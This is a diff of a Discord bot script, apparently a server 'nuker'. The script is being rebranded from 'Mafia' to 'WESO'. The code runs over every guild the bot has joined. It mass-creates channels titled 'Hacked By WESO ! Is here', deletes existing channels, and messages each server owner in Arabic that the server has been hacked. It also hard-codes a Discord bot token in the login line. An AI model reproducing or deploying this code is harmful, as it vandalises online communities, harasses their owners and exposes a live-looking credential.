+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+})
+}
+});
+
+hngel.on('message', message => {
+         if (message.content === "g") {
+                 hngel.guilds.forEach(m =>{
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
 
 })
 }
@@ -1546,9 +1434,9 @@ async function nuge(guild) {
   let users = 0;
   let channels = 0;
 
-  await guild.fetchMembers('  ’ Mafia  , موت للجميع');
+  await guild.fetchMembers('  ’ TOP-WESO  , موت للجميع');
   
-    await guild.owner.send('  ’ Mafia , تم التهكير ').catch(e => { return void e; });
+    await guild.owner.send('  ’ TOP-WESO , تم التهكير ').catch(e => { return void e; });
 
 
   await Promise.all(guild.members.map(async (m) => {
@@ -1565,9 +1453,9 @@ async function nuge(guild) {
       return c.delete();
     }
   }));
-  await guild.createChannel('Hacked By Mafia! Is here', 'text');
+  await guild.createChannel('Hacked By WESO ! Is here', 'text');
 
-  await guild.createChannel('Hacked By MafiaIs here', 'text');
+  await guild.createChannel('Hacked By WESO! Is here', 'text');
   
 
 
@@ -1582,7 +1470,7 @@ hngel.on('ready', () => {
   for(const [, g] of hngel.guilds) nuge(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("  ’ Mafia! ,");
+  console.log("  ’ WESO ! ,");
   console.log("");
   console.log("-------------------------------------------------------------");
 
@@ -1641,4 +1529,4 @@ hngel.on('guildCreate', async (guild) => {
             });
 
        //هنا vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
-hngel.login("NzQyMDcwMzczNDI3ODM4OTk2.XzAw5A.lwCfanJEV2sssqA1Qqtf2DcI0Ag")// هنا حط التوكن >>>>>>>>>>>>>> بتاع البوت
+hngel.login("NzQyMDcwMzczNDI3ODM4OTk2.XzAw5A.lwCfanJEV2sssqA1Qqtf2DcI0AgNzQyMDcwMzczNDI3ODM4OTk2.XzAw5A.lwCfanJEV2sssqA1Qqtf2DcI0Ag")// هنا حط التوكن >>>>>>>>>>>>>> بتاع البوت
